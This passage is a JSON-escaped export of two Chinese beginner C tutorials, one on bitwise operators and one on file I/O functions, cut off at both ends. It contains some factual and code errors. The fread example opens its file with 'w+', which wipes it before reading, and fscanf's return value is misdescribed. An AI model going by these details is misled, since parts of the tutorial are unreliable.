^</td>\n<td>相对应的两个位相同为0，相异（不同）为1</td>\n</tr>\n</tbody></table>\n<p>&lt;&lt;和&gt;&gt;运算符，通过箭头方向可以很好的辨别，分别是C语言位运算符中的左移运算符和右移运算符，如表达式13&lt;&lt;2，它的运算过程为：13的用二进制（四个字节，不考虑符号）表示为，0000 0000 0000 0000 0000 0000 0000 1101，那么向左移两位，右侧补0，则变为0000 0000 0000 0000 0000 0000 0011 0100 换成十进制即变为52，大家可以自行验证。</p>\n<p>同理，再举一个例子，如表达式25&gt;&gt;3，表示25的二进制位向右移三位，由</p>\n<p>0000 0000 0000 0000 0000 0000 0001 1001 变为0000 0000 0000 0000 0000 0000 0000 0011 即十进制3</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a,b;</span><br><span class=\"line\">    a=<span class=\"number\">13</span>&lt;&lt;<span class=\"number\">2</span>;</span><br><span class=\"line\">    b=<span class=\"number\">25</span>&gt;&gt;<span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a=%d,b=%d\\n&quot;</span>,a,b);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"number\">52</span>,b=<span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>移位运算符的作用：</strong></p>\n<p>​    1.左移N位的本质是乘以2的N次方</p>\n<p>​    2.右移N位的本质是除以2的N次方</p>\n<p><strong>&amp;按位与运算符</strong>                </p>\n<p>按位与运算符&amp;，有点和前面学过的逻辑与（&amp;&amp;）运算符类似，只有一个&amp;，都是同为1则为1。不同的是按位相互运算。如3&amp;5，运算过程如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">3</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0011</span></span><br><span class=\"line\"><span class=\"number\">5</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0101</span></span><br><span class=\"line\">&amp; ------------------------------------------</span><br><span class=\"line\">  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0001</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到3&amp;5的结果即十进制1</p>\n<p><strong>按位与运算符的作用:</strong></p>\n<ol>\n<li><p>清零</p>\n<p>我们可以对某一个数与0进行按位与运算，由于两个位都为1才为1，因此最终全部位都变为0，起到清零的作用</p>\n</li>\n<li><p>取指定位</p>\n<p>如某些存储场景下，“第1<del>3位表示xxxx“”，我们需要取出1</del>3位，则可以让原数值与数字7进行按位与运算，得到的结果即是原数值的1~3位的值。</p>\n</li>\n<li><p>判断奇偶</p>\n<p>可以发现，数字的奇偶取决于二进制位的最低一位是1还是0，因此只需要与1按位与运算，判断是1是0即可得知奇偶。</p>\n</li>\n</ol>\n<p><strong>|按位或运算符</strong>                </p>\n<p>|按位或运算符，同样，它也与我们前面学过的逻辑或运算符类似，只有一个竖线表示，作用位，两个对应的二进制位有一个为1结果即为1。如8|7的运算过程可以如下表示：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">8</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">1000</span></span><br><span class=\"line\"><span class=\"number\">7</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0111</span></span><br><span class=\"line\">&amp; ------------------------------------------</span><br><span class=\"line\">  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">1111</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到最终的二进制结果换算成十进制即为15（并不是单纯8+7得来的哦！）</p>\n<p><strong>按位或运算符的作用：</strong></p>\n<ol>\n<li><p>对一个数字的指定位，置为1</p>\n<p>如“某个数字的第七位”表示开关，原先是0，需要改为1的状态，即可以将这个数字与64按位或，即可得到第七位变为1，其余位的值依旧不变。</p>\n</li>\n</ol>\n<p><strong>^按位异或运算符</strong>                </p>\n<p>^表示按位异或运算符，顾名思义，相异，即不同则为1，反之为0</p>\n<p>例如15和16进行异或运算，运算过程如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">15</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">1111</span></span><br><span class=\"line\"><span class=\"number\">16</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0001</span> <span class=\"number\">0000</span></span><br><span class=\"line\">^ ------------------------------------------</span><br><span class=\"line\">   <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0000</span> <span class=\"number\">0000</span>  <span class=\"number\">0001</span> <span class=\"number\">1111</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到，经过按位异或运算后，其结果变成十进制应为31，大家务必弄清楚运算过程，然后再上机验证，代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a;</span><br><span class=\"line\">    a=<span class=\"number\">15</span>^<span class=\"number\">16</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a=%d\\n&quot;</span>,a);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>异或运算符的作用</strong></p>\n<p>指定位数的翻转</p>\n<p>如想对某个数字的低4位进行翻转，则可以将这个数字与15（二进制为00001111）进行按位异或运算，既可以将原数字的低四位进行翻转，即高四位不变，低四位0变1,1变0</p>\n<p>与0异或还是原值</p>\n<p>大家可以自行实验，一个数字与0进行异或，结果还是原值</p>\n<p>交换两个数字</p>\n<p>除了之前我们学习交换两个数字需要第三个变量做中介之外，如今可以通过异或运算进行，代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">swap</span><span class=\"params\">(<span class=\"keyword\">int</span> *a,<span class=\"keyword\">int</span> *b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (*a!=*b)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        *a=*a^*b;</span><br><span class=\"line\">        *b=*b^*a;</span><br><span class=\"line\">        *a=*a^*b;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a=<span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> b=<span class=\"number\">5</span>;</span><br><span class=\"line\">    swap(&amp;a,&amp;b);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a=%d b=%d\\n&quot;</span>,a,b);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//a=5 b=5</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>~取反运算符</strong>                </p>\n<p>~取反运算符，是对数值的二进制位进行取反，是第一个单目运算符，因为只有一个运算对象，运算过程是即0变为1,1变为0，非常好理解。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> a=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;~a=%u\\n&quot;</span>,~a);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//~a=4294967294</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"打开文件fopen函数的用法\"><a href=\"#打开文件fopen函数的用法\" class=\"headerlink\" title=\"打开文件fopen函数的用法\"></a>打开文件fopen函数的用法</h4><p>在C语言中，对文件操作之前，首先需要打开文件，使用的函数是fopen函数，它的作用是打开文件，获取该文件的文件指针，方便后续操作。函数原型为: </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">FILE *<span class=\"title\">fopen</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *filename, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *mode)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>可以看得出来，该函数需要两个字符串类型的参数，第一个是文件名，既要操作的文件对象。第二个是打开方式，这里的打开方式只是，对文件以何种模式打开，包括文本模式打开还是二进制打开、是读还是写还是追加等等等等,具体类型如下表，可以根据情况使用：</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>r</td>\n<td>以只读方式打开文件，该文件必须存在。</td>\n</tr>\n<tr>\n<td>r+</td>\n<td>以读/写方式打开文件，该文件必须存在。</td>\n</tr>\n<tr>\n<td>rb+</td>\n<td>以读/写方式打开一个二进制文件，只允许读/写数据。</td>\n</tr>\n<tr>\n<td>rt+</td>\n<td>以读/写方式打开一个文本文件，允许读和写。</td>\n</tr>\n<tr>\n<td>w</td>\n<td>打开只写文件，若文件存在则文件长度清为零，即该文件内容会消失；若文件不存在则创建该文件。</td>\n</tr>\n<tr>\n<td>w+</td>\n<td>打开可读/写文件，若文件存在则文件长度清为零，即该文件内容会消失；若文件不存在则创建该文件。</td>\n</tr>\n<tr>\n<td>a</td>\n<td>以附加的方式打开只写文件。若文件不存在，则会创建该文件；如果文件存在，则写入的数据会被加到文件尾后，即文件原先的内容会被保留（EOF 符保留）。</td>\n</tr>\n<tr>\n<td>a+</td>\n<td>以附加方式打开可读/写的文件。若文件不存在，则会创建该文件，如果文件存在，则写入的数据会被加到文件尾后，即文件原先的内容会被保留（EOF符不保留）。</td>\n</tr>\n<tr>\n<td>wb</td>\n<td>以只写方式打开或新建一个二进制文件，只允许写数据。</td>\n</tr>\n<tr>\n<td>wb+</td>\n<td>以读/写方式打开或新建一个二进制文件，允许读和写。</td>\n</tr>\n<tr>\n<td>wt+</td>\n<td>以读/写方式打开或新建一个文本文件，允许读和写。</td>\n</tr>\n<tr>\n<td>at+</td>\n<td>以读/写方式打开一个文本文件，允许读或在文本末追加数据。</td>\n</tr>\n<tr>\n<td>ab+</td>\n<td>以读/写方式打开一个二进制文件，允许读或在文件末追加数据。</td>\n</tr>\n</tbody></table>\n<p>函数的返回值则表示打开成功后的文件指针，格式为FILE类型，是一个结构体类型，供后面使用，如果打开失败，则返回NULL</p>\n<p>FILE结构体类型虽用不到，但可以了解，定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span> </span><br><span class=\"line\">　　<span class=\"keyword\">int</span> level;　　　　　　　　　　　``<span class=\"comment\">/* fill/empty level of buffer */</span></span><br><span class=\"line\">　　<span class=\"keyword\">unsigned</span> flags; 　　　　　 ``<span class=\"comment\">/* File status flags */</span></span><br><span class=\"line\">　　<span class=\"keyword\">char</span> fd;　　　　　　　　　　　 ``<span class=\"comment\">/* File descriptor */</span></span><br><span class=\"line\">　　<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> hold;　　　　 ``<span class=\"comment\">/* Ungetc char if no buffer */</span></span><br><span class=\"line\">　　<span class=\"keyword\">int</span> bsize;　　　　　　　　　　 ``<span class=\"comment\">/* Buffer size */</span></span><br><span class=\"line\">　　<span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> _FAR *buffer;　``<span class=\"comment\">/* Data transfer buffer */</span></span><br><span class=\"line\">　　<span class=\"keyword\">unsigned</span>  <span class=\"keyword\">char</span> _FAR *curp;　　``<span class=\"comment\">/* Current active pointer */</span></span><br><span class=\"line\">　　<span class=\"keyword\">unsigned</span> istemp;　　　　　　``<span class=\"comment\">/* Temporary file indicator */</span></span><br><span class=\"line\">　　<span class=\"keyword\">short</span> token;　　　　　　　　 ``<span class=\"comment\">/* Used for validity checking */</span></span><br><span class=\"line\">&#125;FILE;　　　　　　　　　　　　 ``<span class=\"comment\">/* This is the FILE object */</span></span><br></pre></td></tr></table></figure>\n\n<p>比如，如果我们现在想打开一个D盘根目录下的abc.dat，并且想读出该文件里的数据，那么我们可以这样写：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FILE *fp;</span><br><span class=\"line\">fp=fopen(<span class=\"string\">&quot;d:\\\\abc.dat&quot;</span>,<span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">//后面通过fp指针开始读文件</span></span><br></pre></td></tr></table></figure>\n\n<p>值得说明的是</p>\n<p>1.该文件的目录是绝对路径，因此这样写，如果不写盘符比如abc.dat则表示相对路径，表示与本程序同目录下。</p>\n<p>2.路径中的反斜杠虽然只有一个，但这里打了两个，原因在于C语言字符串中对反斜杠要当作转义字符处理，因此要用两个反斜杠才能表示一个。</p>\n<p>3.一旦以r也就是只读的方式打开文件，后面则不允许写数据，否则会出错，一定要保持一致！</p>\n<h4 id=\"写文件fprintf函数的用法\"><a href=\"#写文件fprintf函数的用法\" class=\"headerlink\" title=\"写文件fprintf函数的用法\"></a>写文件fprintf函数的用法</h4><p>我们学会了打开文件之后，如果打开模式是写，那么可以用fprintf函数来进行写，下面来介绍fprintf函数，它的原型是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fprintf</span> <span class=\"params\">(FILE* stream, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span>*format, [argument])</span></span></span><br></pre></td></tr></table></figure>\n\n<p>该函数是一个格式化写入的库函数，可以看到，除了长得和printf函数很像以外，参数也非常像，多了一个第一个参数，文件指针，即第一步打开文件时得到的文件指针，后面的参数和printf一样，按照指定的格式将数据写入文件。例如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">fprintf</span>(fp,<span class=\"string\">&quot;%s&quot;</span>,<span class=\"string\">&quot;www.fbc123.com&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>这句代码的意思是将字符串”<a href=\"http://www.fbc123.com&quot;/\">www.fbc123.com&quot;</a> 以%s的格式写入fp所指向的文件中</p>\n<table>\n<thead>\n<tr>\n<th>控制符</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%c</td>\n<td>字符</td>\n</tr>\n<tr>\n<td>%d 或 %i</td>\n<td>有符号十进制整数</td>\n</tr>\n<tr>\n<td>%e</td>\n<td>使用 e 字符的科学科学记数法（尾数和指数）</td>\n</tr>\n<tr>\n<td>%E</td>\n<td>使用 E 字符的科学科学记数法（尾数和指数）</td>\n</tr>\n<tr>\n<td>%f</td>\n<td>十进制浮点数</td>\n</tr>\n<tr>\n<td>%g</td>\n<td>自动选择 %e 或 %f 中合适的表示法</td>\n</tr>\n<tr>\n<td>%G</td>\n<td>自动选择 %E 或 %f 中合适的表示法</td>\n</tr>\n<tr>\n<td>%o</td>\n<td>有符号八进制</td>\n</tr>\n<tr>\n<td>%s</td>\n<td>字符的字符串</td>\n</tr>\n<tr>\n<td>%u</td>\n<td>无符号十进制整数</td>\n</tr>\n<tr>\n<td>%x</td>\n<td>无符号十六进制整数</td>\n</tr>\n<tr>\n<td>%X</td>\n<td>无符号十六进制整数（大写字母）</td>\n</tr>\n<tr>\n<td>%p</td>\n<td>指针地址</td>\n</tr>\n<tr>\n<td>%n</td>\n<td>无输出</td>\n</tr>\n<tr>\n<td>%</td>\n<td>字符</td>\n</tr>\n</tbody></table>\n<p>更多的格式可以参照printf中的格式，可以通用</p>\n<p>而返回值为整型，如果写入成功则返回写入字符的格式，否则返回一个负数。</p>\n<p>需要注意理解的是，fprintf函数虽然和printf函数很像，表示输出，但准确说是是写入的意思，是指程序向文件里写，要清楚数据的流向。</p>\n<h4 id=\"读文件fscanf函数的用法\"><a href=\"#读文件fscanf函数的用法\" class=\"headerlink\" title=\"读文件fscanf函数的用法\"></a>读文件fscanf函数的用法</h4><p>如同printf与scanf的关系一样，fprintf和fscanf也是如此，fprintf负责向文件里写数据，fscanf函数则可以从文件里读数据</p>\n<p>它的函数原型如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fscanf</span><span class=\"params\">(FILE *stream, <span class=\"keyword\">char</span> *format[,argument...])</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>作为格式化写数据函数，它的参数同样比scanf也多一个参数，即第一个参数文件指针，表示读取的文件目标，其余参数和scanf一样，按照相应的格式进行读取，返回值表示读取数据的字节数。比如：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> str[<span class=\"number\">100</span>];</span><br><span class=\"line\"><span class=\"built_in\">fscanf</span>(fp,<span class=\"string\">&quot;%s&quot;</span>,str);</span><br></pre></td></tr></table></figure>\n\n<p>则表示从fp所指向的文件中进行读数据，与空格或换行结束，将结果保存到str数组中</p>\n<p>更多scanf的格式如下表：</p>\n<table>\n<thead>\n<tr>\n<th>格式</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%d</td>\n<td>读入一个十进制整数</td>\n</tr>\n<tr>\n<td>%i</td>\n<td>读入十进制，八进制，十六进制整数，与%d类似，但是在编译时通过数据前置或后置来区分进制，如加入“0x”则是十六进制，加入“0”则为八进制。例如串“031”使用%d时会被算作31，但是使用%i时会算作25</td>\n</tr>\n<tr>\n<td>%u</td>\n<td>读入一个无符号十进制整数</td>\n</tr>\n<tr>\n<td>%f %F %g %G</td>\n<td>用来输入实数，可以用小数形式或指数形式输入</td>\n</tr>\n<tr>\n<td>%x %x</td>\n<td>读入十六进制整数</td>\n</tr>\n<tr>\n<td>%o</td>\n<td>读入八进制整数</td>\n</tr>\n<tr>\n<td>%s</td>\n<td>直到遇到一个空格字符（空格字符可以是空白、换行和制表符）。</td>\n</tr>\n<tr>\n<td>%c</td>\n<td>单个字符：读取下一个字符。如果指定了一个不为 1 的宽度 width，函数会读取 width 个字符，并通过参数传递，把它们存储在数组中连续位置。在末尾不会追加空字符。</td>\n</tr>\n</tbody></table>\n<h4 id=\"写文件fwrite函数的用法\"><a href=\"#写文件fwrite函数的用法\" class=\"headerlink\" title=\"写文件fwrite函数的用法\"></a>写文件fwrite函数的用法</h4><p>fwrite函数是写文件的函数，它的函数原型如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">size_t</span> <span class=\"title\">fwrite</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">void</span> *ptr, <span class=\"keyword\">size_t</span> size, <span class=\"keyword\">size_t</span> nmemb, FILE *stream)</span></span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到这个函数的参数有四个:</p>\n<p>第一个ptr是要写入的数据的头指针，无符号类型；</p>\n<p>第二个参数size是大小，表示每个写入元素的大小，单位是字节；</p>\n<p>第三个参数nmemb是个数，以上一个参数为单位的个数；</p>\n<p>第四个参数stream就是文件指针，表示往哪里写。</p>\n<p>至于返回值，如果成功执行，则返回写入元素的个数，如果不和nmemb相等，则表示出错。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   FILE *fp;   </span><br><span class=\"line\">   <span class=\"keyword\">char</span> str[] = <span class=\"string\">&quot;www.fbc123.com&quot;</span>; </span><br><span class=\"line\">   fp = fopen( <span class=\"string\">&quot;fbc123.dat&quot;</span> , <span class=\"string\">&quot;w&quot;</span> );   </span><br><span class=\"line\">   fwrite(str, <span class=\"keyword\">sizeof</span>(str) , <span class=\"number\">1</span>, fp ); </span><br><span class=\"line\">   fclose(fp);  </span><br><span class=\"line\">   <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如代码所示，程序运行后，并不会在屏幕上有任何显示，而是将str中的字符串写入了fbc123.dat这个文件中，待程序运行结束退出后，大家可以打开程序同级目录下的fbc123.dat文件对比</p>\n<h4 id=\"读文件fread函数的用法\"><a href=\"#读文件fread函数的用法\" class=\"headerlink\" title=\"读文件fread函数的用法\"></a>读文件fread函数的用法</h4><p>与fwrite是一对，读文件的函数fread的函数原型如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">size_t</span> <span class=\"title\">fread</span><span class=\"params\">(<span class=\"keyword\">void</span> *ptr, <span class=\"keyword\">size_t</span> size, <span class=\"keyword\">size_t</span> nmemb, FILE *stream)</span></span></span><br></pre></td></tr></table></figure>\n\n<p>fread函数的作用是从文件里读内容到程序中，它的参数意思是：</p>\n<p>第一个参数ptr表示盛放内容的首地址</p>\n<p>第二个参数size表示每个元素的大小，单位还是字节</p>\n<p>第三个参数nmem表示要读取的元素个数</p>\n<p>第四个参数stream表示的是文件指针，即从哪个文件中读取</p>\n<p>返回值则是表示读取元素的个数，与nmemb一致表示读取成功，否则失败</p>\n<p>实例代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span>  </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   FILE *fp;</span><br><span class=\"line\">   <span class=\"keyword\">char</span> buffer[<span class=\"number\">100</span>];</span><br><span class=\"line\">   <span class=\"comment\">/* 首先打开文件，读写都可以，假设文件中已经有内容为www.fbc123.com */</span></span><br><span class=\"line\">   fp = fopen(<span class=\"string\">&quot;fbc123.dat&quot;</span>, <span class=\"string\">&quot;w+&quot;</span>); </span><br><span class=\"line\">     <span class=\"comment\">/* 读取并显示数据 */</span></span><br><span class=\"line\">   fread(buffer, <span class=\"number\">1</span>, <span class=\"number\">15</span>, fp);</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, buffer);</span><br><span class=\"line\">   fclose(fp);   </span><br><span class=\"line\">   <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要注意文件的打开方式，以及保证文件中有数据，并且buffer空间足够大才可以，大家可以上机实验</p>\n<h4 id=\"关闭文件fclose函数的用法\"><a 